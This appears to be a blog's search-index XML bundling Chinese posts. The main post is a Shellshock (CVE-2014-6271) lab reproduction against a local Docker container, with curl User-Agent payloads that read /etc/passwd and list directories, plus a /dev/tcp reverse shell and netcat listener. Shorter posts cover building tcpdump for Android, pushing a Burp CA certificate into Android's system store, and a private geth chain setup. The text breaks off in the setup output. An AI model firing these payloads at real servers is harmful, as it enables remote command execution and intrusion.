<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Bash ShellShock CVE-2014-6271(破壳)</title>
    <url>/vuls/Bash%20ShellShock%20CVE-2014-6271(%E7%A0%B4%E5%A3%B3).html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题的是以<code>()&#123;</code>开头定义的环境变量在命令<code>EVN</code>中解析成函数后，Bash执行并未推出，而是继续解析并执行shell命令。而其核心的原因在于输入的过滤中没有严格限制边界，也没有作出合法化的参数判断。</p>
<p>在补丁中主要进行了参数的合法性过滤，补丁程序在<code>/builtins/evalstring.c</code>的<code>parse_and_execute</code>函数中对输入的合法性边界检测，将代码注入的可能性排除。在排除中，主要用到了<code>flag</code>的两次判断和<code>command</code>的一次类型匹配，为了能够<code>flag</code>判断准确，在补丁中预先定义了<code>SEVAL_FUNCDEF</code>、<code>SEVAL_ONECMD</code>两个标识作为判断依据。此漏洞的补丁更新有三处，主要进行输入的command进行过滤作用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* /builtins/common.h */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEVAL_FUNCDEF 	0x080		<span class="comment">/* only allow function definitions */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEVAL_ONECMD 	0x100		<span class="comment">/* only allow a single command */</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* /builtins/evalstring.c */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((flags &amp; SEVAL_FUNCDEF) &amp;&amp; command-&gt;type != cmd_function_def )</span><br><span class="line">	&#123;</span><br><span class="line">	internal_warning(<span class="string">&quot;%s: ignoring function definition attempt&quot;</span>, from_file);</span><br><span class="line">	should_jump_to_top_level = <span class="number">0</span>;</span><br><span class="line">	last_result = last_command_exit_value = EX_BADUSAGE;</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* /builtins/evalstring.c */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; SEVAL_ONECMD)</span><br><span class="line">	<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>从以上阐述的漏洞原理可知，漏洞的根本原因存在于Bash的<code>ENV</code>命令实现上，因此漏洞本身是不能够直接导致远程代码执行的。如果要达到远程代码执行的目的，必须借助第三方服务程序作为媒介才能够实现，第三方服务程序也必须要满足众多条件才可以充当此媒介的角色。例如，<code>apache2</code>便可以，其<code>CGI</code>组件满足远程访问并调用Bash的ENV命令进行访问数据解析功能。漏洞实现远程代码执行原理图如下：<br><img src="/images/db3f40e9f1e1a523c0dc165a926dab85bff11b09.png" alt="14139550048538.png"></p>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><code>VulApps/b/bash/shellshock1_CVE-2014-6271</code></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="本地验证"><a href="#本地验证" class="headerlink" title="本地验证"></a>本地验证</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">m0nst3r@digapis:~/study/VulApps/b/bash/shellshock1_CVE-2014-6271$ docker run -t -i medicean/vulapps:b_bash_shellshock1 /bin/bash</span><br><span class="line">bash-4.3<span class="comment"># env x=&#x27;() &#123; :;&#125;; echo Vulnerable&#x27; bash -c &quot;echo test&quot;                                                                                                  </span></span><br><span class="line">Vulnerable</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">bash-4.3<span class="comment"># uname -a</span></span><br><span class="line">Linux 65ce71c540ba 4.13.0-37-generic <span class="comment">#42~16.04.1-Ubuntu SMP Wed Mar 7 16:03:28 UTC 2018 x86_64 GNU/Linux</span></span><br><span class="line">bash-4.3<span class="comment"># cat /etc/issue       </span></span><br><span class="line">Debian GNU/Linux 8 \n \l</span><br><span class="line"></span><br><span class="line">bash-4.3<span class="comment"># /bin/bash --version</span></span><br><span class="line">GNU bash, version 4.3.24(1)-release (x86_64-unknown-linux-gnu)</span><br><span class="line">Copyright (C) 2013 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line"></span><br><span class="line">This is free software; you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">bash-4.3<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>执行命令后，如果显示<code>Vulnerable</code>，证明系统存在漏洞，可改变<code>echo Vulnerable</code>为任意命令进行执行。</p>
<h3 id="远程验证"><a href="#远程验证" class="headerlink" title="远程验证"></a>远程验证</h3><p>利用<code>VulApps</code>提供的Docker，看下目录结构：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-4.3<span class="comment"># cd /usr/local/apache2/cgi-bin/</span></span><br><span class="line">bash-4.3<span class="comment"># ls</span></span><br><span class="line">poc.cgi  <span class="built_in">printenv</span>  test-cgi</span><br></pre></td></tr></table></figure>

<p><code>poc.cgi</code>的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-4.3<span class="comment"># cat poc.cgi </span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Content-type: text/html&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;html&gt;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;head&gt;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;title&gt;Bash ShellShock&lt;/title&gt;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;/head&gt;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;body&gt;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span></span><br><span class="line">/usr/bin/env</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;/body&gt;&#x27;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;/html&gt;&#x27;</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure>

<p><code>printenv</code>的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-4.3<span class="comment"># cat printenv </span></span><br><span class="line"><span class="comment">#!/usr/local/bin/perl</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment">##  printenv -- demo CGI program which just prints its environment</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Content-type: text/plain; charset=iso-8859-1\n\n&quot;</span>;</span><br><span class="line">foreach <span class="variable">$var</span> (<span class="built_in">sort</span>(keys(%ENV))) &#123;</span><br><span class="line">    <span class="variable">$val</span> = <span class="variable">$ENV</span>&#123;<span class="variable">$var</span>&#125;;</span><br><span class="line">    <span class="variable">$val</span> =~ s|\n|\\n|g;</span><br><span class="line">    <span class="variable">$val</span> =~ s|<span class="string">&quot;|\\&quot;</span>|g;</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;<span class="variable">$&#123;var&#125;</span>=\&quot;<span class="variable">$&#123;val&#125;</span>\&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>test-cgi</code>的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-4.3<span class="comment"># cat test-cgi </span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># disable filename globbing</span></span><br><span class="line"><span class="built_in">set</span> -f</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Content-type: text/plain; charset=iso-8859-1&quot;</span></span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> CGI/1.0 <span class="built_in">test</span> script report:</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> argc is <span class="variable">$#</span>. argv is <span class="string">&quot;$*&quot;</span>.</span><br><span class="line"><span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> SERVER_SOFTWARE = <span class="variable">$SERVER_SOFTWARE</span></span><br><span class="line"><span class="built_in">echo</span> SERVER_NAME = <span class="variable">$SERVER_NAME</span></span><br><span class="line"><span class="built_in">echo</span> GATEWAY_INTERFACE = <span class="variable">$GATEWAY_INTERFACE</span></span><br><span class="line"><span class="built_in">echo</span> SERVER_PROTOCOL = <span class="variable">$SERVER_PROTOCOL</span></span><br><span class="line"><span class="built_in">echo</span> SERVER_PORT = <span class="variable">$SERVER_PORT</span></span><br><span class="line"><span class="built_in">echo</span> REQUEST_METHOD = <span class="variable">$REQUEST_METHOD</span></span><br><span class="line"><span class="built_in">echo</span> HTTP_ACCEPT = <span class="string">&quot;<span class="variable">$HTTP_ACCEPT</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> PATH_INFO = <span class="string">&quot;<span class="variable">$PATH_INFO</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> PATH_TRANSLATED = <span class="string">&quot;<span class="variable">$PATH_TRANSLATED</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> SCRIPT_NAME = <span class="string">&quot;<span class="variable">$SCRIPT_NAME</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> QUERY_STRING = <span class="string">&quot;<span class="variable">$QUERY_STRING</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> REMOTE_HOST = <span class="variable">$REMOTE_HOST</span></span><br><span class="line"><span class="built_in">echo</span> REMOTE_ADDR = <span class="variable">$REMOTE_ADDR</span></span><br><span class="line"><span class="built_in">echo</span> REMOTE_USER = <span class="variable">$REMOTE_USER</span></span><br><span class="line"><span class="built_in">echo</span> AUTH_TYPE = <span class="variable">$AUTH_TYPE</span></span><br><span class="line"><span class="built_in">echo</span> CONTENT_TYPE = <span class="variable">$CONTENT_TYPE</span></span><br><span class="line"><span class="built_in">echo</span> CONTENT_LENGTH = <span class="variable">$CONTENT_LENGTH</span></span><br></pre></td></tr></table></figure>

<p>运行docker：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">m0nst3r@digapis:~/study/VulApps/b/bash/shellshock1_CVE-2014-6271$ docker run -it -d -p 80:80 medicean/vulapps:b_bash_shellshock1 </span><br><span class="line">5f50262d8cbf791142822e857f32f4f8e33920ba2f6484c08e1e4f65749ca41f</span><br></pre></td></tr></table></figure>

<p>访问本地地址：<br><img src="/images/1ebd60facde9478230d4b2e76342ac38e0f932c9.png" alt="Screenshot from 2018-03-29 12-16-38.png"></p>
<p>测试命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">m0nst3r@digapis:/$ curl -A <span class="string">&#x27;() &#123; :; &#125;; a=`/bin/cat /etc/passwd`;echo $a&#x27;</span> <span class="string">&quot;http://127.0.0.1/cgi-bin/poc.cgi&quot;</span> -v</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET /cgi-bin/poc.cgi HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1</span><br><span class="line">&gt; User-Agent: () &#123; :; &#125;; a=`/bin/cat /etc/passwd`;<span class="built_in">echo</span> <span class="variable">$a</span></span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Thu, 29 Mar 2018 04:18:39 GMT</span><br><span class="line">&lt; Server: Apache/2.2.31 (Unix) mod_ssl/2.2.31 OpenSSL/1.0.1t DAV/2</span><br><span class="line">&lt; root: x:0:0:root:/root:/bin/bash</span><br><span class="line">&lt; daemon: x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">&lt; bin: x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">&lt; sys: x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">&lt; <span class="built_in">sync</span>: x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">&lt; games: x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">&lt; man: x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">&lt; lp: x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">&lt; mail: x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">&lt; news: x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">&lt; uucp: x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">&lt; proxy: x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">&lt; www-data: x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">&lt; backup: x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">&lt; list: x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">&lt; irc: x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">&lt; gnats: x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">&lt; nobody: x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">&lt; systemd-timesync: x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">&lt; systemd-network: x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">&lt; systemd-resolve: x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">&lt; systemd-bus-proxy: x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; </span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Bash ShellShock&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">SERVER_SIGNATURE=</span><br><span class="line">UNIQUE_ID=WrxpH6wRAAIAAAAODMgAAAAF</span><br><span class="line">SERVER_PORT=80</span><br><span class="line">HTTP_HOST=127.0.0.1</span><br><span class="line">DOCUMENT_ROOT=/usr/local/apache2/htdocs</span><br><span class="line">SCRIPT_FILENAME=/usr/local/apache2/cgi-bin/poc.cgi</span><br><span class="line">REQUEST_URI=/cgi-bin/poc.cgi</span><br><span class="line">SCRIPT_NAME=/cgi-bin/poc.cgi</span><br><span class="line">REMOTE_PORT=43562</span><br><span class="line">PATH=/usr/local/apache2/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">PWD=/usr/local/apache2/cgi-bin</span><br><span class="line">SERVER_ADMIN=you@example.com</span><br><span class="line">HTTP_ACCEPT=*/*</span><br><span class="line">REMOTE_ADDR=172.17.0.1</span><br><span class="line">SHLVL=1</span><br><span class="line">SERVER_NAME=127.0.0.1</span><br><span class="line">SERVER_SOFTWARE=Apache/2.2.31 (Unix) mod_ssl/2.2.31 OpenSSL/1.0.1t DAV/2</span><br><span class="line">QUERY_STRING=</span><br><span class="line">SERVER_ADDR=172.17.0.2</span><br><span class="line">GATEWAY_INTERFACE=CGI/1.1</span><br><span class="line">SERVER_PROTOCOL=HTTP/1.1</span><br><span class="line">REQUEST_METHOD=GET</span><br><span class="line">HTTP_USER_AGENT=() &#123;  :</span><br><span class="line">&#125;</span><br><span class="line">_=/usr/bin/env</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">* Connection <span class="comment">#0 to host 127.0.0.1 left intact</span></span><br></pre></td></tr></table></figure>

<p>命令中可改变<code>a=`/bin/cat/etc/passwd`;echo $a</code>为任意命令进行执行。</p>
<p>另外一种命令执行方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">m0nst3r@digapis:/$ curl -A <span class="string">&#x27;() &#123; :; &#125;; echo ; echo $(/bin/ls -al /);&#x27;</span> <span class="string">&quot;http://127.0.0.1/cgi-bin/poc.cgi&quot;</span> -v</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET /cgi-bin/poc.cgi HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1</span><br><span class="line">&gt; User-Agent: () &#123; :; &#125;; <span class="built_in">echo</span> ; <span class="built_in">echo</span> $(/bin/ls -al /);</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Date: Thu, 29 Mar 2018 04:21:50 GMT</span><br><span class="line">&lt; Server: Apache/2.2.31 (Unix) mod_ssl/2.2.31 OpenSSL/1.0.1t DAV/2</span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Content-Type: text/plain</span><br><span class="line">&lt; </span><br><span class="line">total 76</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar 29 03:57 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar 29 03:57 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Mar 29 03:57 .dockerenv</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 30  2016 bin</span><br><span class="line">drwxr-xr-x   2 root root 4096 May 30  2016 boot</span><br><span class="line">drwxr-xr-x   5 root root  360 Mar 29 03:57 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 Mar 29 03:57 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 May 30  2016 home</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 30  2016 lib</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 lib64</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 media</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 mnt</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 opt</span><br><span class="line">dr-xr-xr-x 298 root root    0 Mar 29 03:57 proc</span><br><span class="line">drwx------   2 root root 4096 Jul 27  2016 root</span><br><span class="line">drwxr-xr-x   3 root root 4096 Jul 27  2016 run</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 sbin</span><br><span class="line">drwxr-xr-x   2 root root 4096 Jul 27  2016 srv</span><br><span class="line">dr-xr-xr-x  13 root root    0 Mar 29 04:05 sys</span><br><span class="line">drwxrwxrwt   1 root root 4096 Mar 29 03:57 tmp</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 29  2016 usr</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 30  2016 var</span><br><span class="line">Content-<span class="built_in">type</span>: text/html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;Bash ShellShock&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line">SERVER_SIGNATURE=</span><br><span class="line">UNIQUE_ID=Wrxp3qwRAAIAAAAHAnkAAAAA</span><br><span class="line">SERVER_PORT=80</span><br><span class="line">HTTP_HOST=127.0.0.1</span><br><span class="line">DOCUMENT_ROOT=/usr/local/apache2/htdocs</span><br><span class="line">SCRIPT_FILENAME=/usr/local/apache2/cgi-bin/poc.cgi</span><br><span class="line">REQUEST_URI=/cgi-bin/poc.cgi</span><br><span class="line">SCRIPT_NAME=/cgi-bin/poc.cgi</span><br><span class="line">REMOTE_PORT=43590</span><br><span class="line">PATH=/usr/local/apache2/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">PWD=/usr/local/apache2/cgi-bin</span><br><span class="line">SERVER_ADMIN=you@example.com</span><br><span class="line">HTTP_ACCEPT=*/*</span><br><span class="line">REMOTE_ADDR=172.17.0.1</span><br><span class="line">SHLVL=1</span><br><span class="line">SERVER_NAME=127.0.0.1</span><br><span class="line">SERVER_SOFTWARE=Apache/2.2.31 (Unix) mod_ssl/2.2.31 OpenSSL/1.0.1t DAV/2</span><br><span class="line">QUERY_STRING=</span><br><span class="line">SERVER_ADDR=172.17.0.2</span><br><span class="line">GATEWAY_INTERFACE=CGI/1.1</span><br><span class="line">SERVER_PROTOCOL=HTTP/1.1</span><br><span class="line">REQUEST_METHOD=GET</span><br><span class="line">HTTP_USER_AGENT=() &#123;  :</span><br><span class="line">&#125;</span><br><span class="line">_=/usr/bin/env</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">* Connection <span class="comment">#0 to host 127.0.0.1 left intact</span></span><br></pre></td></tr></table></figure>

<p>反弹Shell的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">m0nst3r@digapis:/$ curl -A <span class="string">&#x27;() &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.89/8888 0&gt;&amp;1;&#x27;</span> <span class="string">&quot;http://127.0.0.1/cgi-bin/poc.cgi&quot;</span> -v</span><br><span class="line">*   Trying 127.0.0.1...</span><br><span class="line">* Connected to 127.0.0.1 (127.0.0.1) port 80 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET /cgi-bin/poc.cgi HTTP/1.1</span><br><span class="line">&gt; Host: 127.0.0.1</span><br><span class="line">&gt; User-Agent: () &#123; :; &#125;; /bin/bash -i &gt;&amp; /dev/tcp/192.168.0.89/8888 0&gt;&amp;1;</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">m0nst3r@digapis:~$ nc -lvp 8888</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8888)</span><br><span class="line">Connection from [172.17.0.2] port 8888 [tcp/*] accepted (family 2, sport 57046)</span><br><span class="line">bash-4.3$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">poc.cgi</span><br><span class="line"><span class="built_in">printenv</span></span><br><span class="line">test-cgi</span><br><span class="line">bash-4.3$ </span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>vuls</category>
      </categories>
  </entry>
  <entry>
    <title>Build tcpdump for Android</title>
    <url>/uncategorized/Build-tcpdump-for-Android.html</url>
    <content><![CDATA[<p>使用从网上下载的tcpdump, 遇到以下错误：</p>
<p><code>error: only position independent executables (PIE) are supported.</code></p>
<p>直接使用NDK在电脑上交叉编译一个。</p>
<p>GitHub上有个脚本，[<a href="https://github.com/imrivera/build-android-tcpdump.git]">https://github.com/imrivera/build-android-tcpdump.git]</a></p>
<p>直接编译会产生错误因为<code>libpcap</code>版本的原因，好在上面的脚本提供了选择版本的参数。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/imrivera/build-android-tcpdump.git</span><br><span class="line">./build-android-tcpdump -a arm64 -n /Users/michael/Library/Android/android-ndk-r10e -l 1.4.0</span><br></pre></td></tr></table></figure>

<p>抓包：<br><code>./tcpdump -vv -p -s 0 -w /sdcard/Mcart003.pcap</code></p>
]]></content>
  </entry>
  <entry>
    <title>Android &gt;=7 Burpsuite 抓包</title>
    <url>/android/Android-7-Burpsuite-%E6%8A%93%E5%8C%85.html</url>
    <content><![CDATA[<h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><p>在Burp中导出证书,这里的名字为<code>burp.der</code>.</p>
<p>然后在命令行中进行如下操作:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform DER -in burp.der -out burp.pem #转换格式</span><br><span class="line">openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1 #打印hash,并将pem命名为hash.0</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">9a5ba575</span></span><br><span class="line">cp burp.pem 9a5ba575.0</span><br><span class="line">adb remount #重新mount</span><br><span class="line">adb push 9a5ba575.0 /system/etc/security/cacerts/ #传上去</span><br><span class="line">adb reboot #搞定</span><br></pre></td></tr></table></figure>

<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><ol>
<li>手机完全root</li>
</ol>
<h1 id="适用"><a href="#适用" class="headerlink" title="适用"></a>适用</h1><p>要测试的APP在<code>容器是的容器</code>里面,<code>sslunpinning</code>有时不能将所有层都hook好,导致一部分流量仍然提示证书错误.</p>
<h1 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">remount of /system failed: Read-only file system</span><br><span class="line">remount failed</span><br></pre></td></tr></table></figure>

<p>解决办法:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb disable-verity</span><br><span class="line">adb reboot</span><br><span class="line">adb remount</span><br><span class="line">adb shell</span><br><span class="line">mount -o rw,remount /system</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
        <tag>android</tag>
        <tag>cert</tag>
      </tags>
  </entry>
  <entry>
    <title>DAPP本地环境部署</title>
    <url>/blockchain/DAPP%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2.html</url>
    <content><![CDATA[<h1 id="DAPP"><a href="#DAPP" class="headerlink" title="DAPP"></a>DAPP</h1><p>dApp在私有测试区块链环境下的部署过程，过程中使用了他人的智能合约及前端程序。</p>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="GO环境"><a href="#GO环境" class="headerlink" title="GO环境"></a>GO环境</h3><p>访问Golang官网并下载：<code>https://golang.org/doc/install</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://golang.org/dl/go1.15.7.linux-amd64.tar.gz</span><br><span class="line">tar -C /usr/local -xzf go1.15.7.linux-amd64.tar.gz # sudo if needed</span><br><span class="line">echo &#x27;export PATH=$PATH:/usr/local/go/bin&#x27; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>

<p>GO &lt;1.13无法从源码安装<code>go-ethereum</code>。</p>
<h3 id="安装geth"><a href="#安装geth" class="headerlink" title="安装geth"></a>安装geth</h3><ol>
<li>下载<code>go-ethereum</code>:<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/ethereum/go-ethereum.git</span><br><span class="line">cd go-ethereum</span><br><span class="line">make geth # make all</span><br><span class="line">echo &#x27;export PATH=$PATH:&lt;PWD&gt;/build/bin&#x27; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="创世"><a href="#创世" class="headerlink" title="创世"></a>创世</h3><p>首先要创建一个配置文件，使用<code>puppeth</code>，在加入节点时无需创建此文件，只需要使用第一个节点创建时生成的json文件即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">michael@michael-ubuntu:~/blockchain$ mkdir -p ChainSkills/private                                                                                           </span><br><span class="line">michael@michael-ubuntu:~/blockchain$ cd ChainSkills/private/</span><br><span class="line">michael@michael-ubuntu:~/blockchain/ChainSkills/private$ puppeth                                                                                            </span><br><span class="line">+-----------------------------------------------------------+                                                                                               </span><br><span class="line">| Welcome to puppeth, your Ethereum private network manager |                                                                                               </span><br><span class="line">|                                                           |                                                                                               </span><br><span class="line">| This tool lets you create a new Ethereum network down to  |                                                                                               </span><br><span class="line">| the genesis block, bootnodes, miners and ethstats servers |                                                                                               </span><br><span class="line">| without the hassle that it would normally entail.         |                                                                                               </span><br><span class="line">|                                                           |                                                                                               </span><br><span class="line">| Puppeth uses SSH to dial in to remote servers, and builds |                                                                                               </span><br><span class="line">| its network components out of Docker containers using the |                                                                                               </span><br><span class="line">| docker-compose toolset.                                   |                                                                                               </span><br><span class="line">+-----------------------------------------------------------+                                                                                               </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">Please specify a network name to administer (no spaces, hyphens or capital letters please)                                                                  </span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">cfca</span>                                                                                                                                                      </span><br><span 